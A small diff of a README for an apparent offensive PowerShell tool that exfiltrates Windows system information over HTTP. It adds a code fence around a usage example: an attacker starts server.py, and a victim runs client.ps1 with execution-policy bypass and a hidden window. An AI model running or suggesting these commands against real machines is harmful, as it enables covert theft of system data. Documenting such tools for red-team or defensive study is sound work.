@@ -8,6 +8,9 @@ A PowerShell script to exfiltrate information of a Windows system via HTTP serve
 4. Create a directory with the system hostname and put all the exfiltrated info into
 
 ### Example
+
+```
 ATTACKER> python3 server.py
 VICTIM> powershell -ep bypass -windowstyle hidden -File client.ps1
+```
 
